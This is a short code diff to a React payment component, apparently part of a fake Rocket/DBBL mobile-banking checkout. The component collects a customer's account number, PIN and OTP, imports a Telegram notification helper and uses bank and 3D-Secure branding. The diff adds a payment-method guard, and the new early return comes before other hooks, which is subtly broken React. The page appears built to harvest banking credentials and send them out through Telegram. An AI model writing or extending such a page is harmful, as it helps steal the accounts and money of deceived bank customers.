@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import dbblHeader from "@/assets/dbbl-header.jpg";
 import secureLogos from "@/assets/3d-secure-logos.jpg";
 import otpIllustration from "@/assets/otp-illustration.jpg";
@@ -9,6 +10,8 @@ const RocketPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const checking = usePaymentMethodGuard("rocket");
+  if (checking) return null;
   const [mobileAccount, setMobileAccount] = useState("");
   const [pin, setPin] = useState("");
   const [otp, setOtp] = useState("");
